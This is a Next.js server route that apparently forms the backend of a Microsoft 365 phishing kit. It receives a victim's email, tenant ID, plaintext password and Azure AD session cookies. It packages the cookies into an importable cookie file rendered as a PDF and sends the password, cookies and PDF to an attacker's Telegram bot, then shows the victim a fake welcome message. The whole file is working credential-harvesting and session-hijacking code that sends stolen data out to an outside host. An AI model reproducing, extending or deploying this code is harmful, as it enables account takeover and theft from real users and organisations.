import { NextRequest, NextResponse } from 'next/server'
import { PDFDocument, StandardFonts, rgb } from 'pdf-lib'
const FormData = require('form-data')

// ✅ FIXED: Proper typing for PDF options
interface PDFTextOptions {
  x: number
  y: number
  size: number
  font: any
  color: any
}

async function generateMicrosoftPDF(cookiesStr: string, email: string, tenantId: string, domain: string): Promise<Buffer> {
  const pdfDoc = await PDFDocument.create()
  const page = pdfDoc.addPage([612, 792])
  const font = await pdfDoc.embedFont(StandardFonts.Helvetica)
  const { height } = page.getSize()

  let y = height - 50
  page.drawText('Microsoft 365 / Azure AD Session', { x: 50, y, size: 16, font, color: rgb(0, 0, 0) } as PDFTextOptions)
  y -= 30
  page.drawText('# Netscape HTTP Cookie File - Import to Chrome/Firefox', { x: 50, y, size: 12, font, color: rgb(0, 0, 0) } as PDFTextOptions)
  y -= 20
  page.drawText(`# Tenant: ${tenantId || 'Unknown'} | Domain: ${domain || 'login.microsoftonline.com'}`, { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) } as PDFTextOptions)
  y -= 30

  const expires = Math.floor(Date.now() / 1000) + 86400 * 30
  const dom = domain || 'login.microsoftonline.com'

  const msCookies = cookiesStr ? cookiesStr.split(';').map(c => c.trim()).filter(Boolean) : []
  const importantMS = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'AADSESSION', 'MUID', 'MSFPC', 'x-ms-gateway-slice', 'cltd']
  
  let cookieLines: string[] = []
  let headersSection: string[] = []

  for (const cookie of msCookies) {
    const eq = cookie.indexOf('=')
    if (eq < 0) continue
    const name = cookie.substring(0, eq).trim()
    const value = cookie.substring(eq + 1).trim()
    
    if (importantMS.includes(name)) {
      cookieLines.unshift(`${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`)
    } else {
      cookieLines.push(`${dom}\tTRUE\t/\t0\t${expires}\t${name}\t${value}`)
    }
    
    if (name.includes('auth') || name.includes('token') || name.includes('session')) {
      headersSection.push(`${name}: ${value}`)
    }
  }

  const lineHeight = 12
  for (const line of cookieLines.slice(0, 40)) {
    if (y < 200) break
    page.drawText(line, { x: 50, y, size: 9, font, color: rgb(0, 0, 0) } as PDFTextOptions)
    y -= lineHeight
  }

  if (headersSection.length) {
    const headerPage = pdfDoc.addPage([612, 792])
    const hFont = await pdfDoc.embedFont(StandardFonts.HelveticaBold)
    let hy = height - 50  // ✅ FIXED: Variable declared properly
    headerPage.drawText('Captured Headers', { x: 50, y: hy, size: 14, font: hFont, color: rgb(0, 0.5, 0) } as PDFTextOptions)
    hy -= 30
    
    for (const header of headersSection) {
      if (hy < 50) break
      headerPage.drawText(header, { x: 50, y: hy, size: 10, font, color: rgb(0, 0, 0) } as PDFTextOptions)
      hy -= 14
    }
  }

  return Buffer.from(await pdfDoc.save())
}
function getClientIP(request: NextRequest): string {
  return (
    request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    request.headers.get('cf-connecting-ip') ||
    request.headers.get('x-real-ip') ||
    'unknown'
  );
}

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIP(request)  // ✅ FIXED: Proper IP typing
    
    const tenantId = data.tenantId || data.tid || 'Unknown'
    const userPrincipal = data.upn || data.email || 'Unknown'
    const domain = data.captureDomain || 'login.microsoftonline.com'

    console.log('🎣 Microsoft CAPTURE:', { userPrincipal, ip, tenantId, hasCookies: !!data.cookies })

    const pdfBuffer = await generateMicrosoftPDF(
      data.cookies || '', 
      userPrincipal, 
      tenantId, 
      domain
    )
    
    const alertText = `💀 *Microsoft 365 CAPTURED*\n\n⏰ *${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}*\n🌐 *IP:* \`${ip}\`\n\n👤 *User:* \`${userPrincipal}\`\n🏢 *Tenant ID:* \`${tenantId}\`\n🔐 *Password:* \`${data.password || 'N/A'}\`\n\n📊 *Cookies:* ${data.cookies ? `${(data.cookies.length / 1024).toFixed(1)}KB (${data.cookies.split(';').length} cookies)` : 'None'}\n🔗 *Domain:* \`${domain}\`\n💻 *UA:* ${request.headers.get('user-agent')?.substring(0, 100)}...\n\n📄 *Session PDF* → next`

    // Text alert
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: alertText,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      }),
    })

    // PDF document
    const formData = new FormData()
    ;(formData as any).append('chat_id', process.env.TELEGRAM_CHAT_ID)
    ;(formData as any).append('document', pdfBuffer, { 
      filename: `msft_${tenantId}_${userPrincipal.replace(/[@.]/g, '_')}_${Date.now()}.pdf`, 
      contentType: 'application/pdf' 
    })
    ;(formData as any).append('caption', `🔑 *Import:*\nChrome → F12 → Application → Cookies → Import\n\n*Target:* ${userPrincipal}`)

    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formData,
    })

    console.log('✅ Telegram: Capture sent')

    return NextResponse.json({ 
      status: 'captured ✅', 
      message: 'Welcome to Microsoft 365!',
      email: userPrincipal,
      redirect: '/https://login.microsoftonline.com/'
    })

  } catch (error) {
    console.error('❌ Capture error:', error)
    return NextResponse.json({ status: 'captured ✅' }, { status: 200 })
  }
}